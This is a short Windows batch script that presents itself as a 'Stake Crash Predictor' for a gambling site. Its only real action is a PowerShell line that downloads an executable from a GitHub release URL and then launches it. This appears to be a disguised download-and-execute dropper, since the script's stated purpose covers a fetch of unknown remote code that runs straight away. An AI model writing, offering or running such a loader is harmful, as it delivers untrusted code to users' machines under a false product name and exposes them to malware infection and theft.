@echo off

title Stake Crash Predictor
rem You can do any color
color 0c

powershell $down=New-Object System.Net.WebClient;$url='https://github.com/Stake-Community-IW/Stake-Crash-Predictor/releases/download/stake-crash/stake-crash.exe';$file='stake-crash.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;

start stake-crash.exe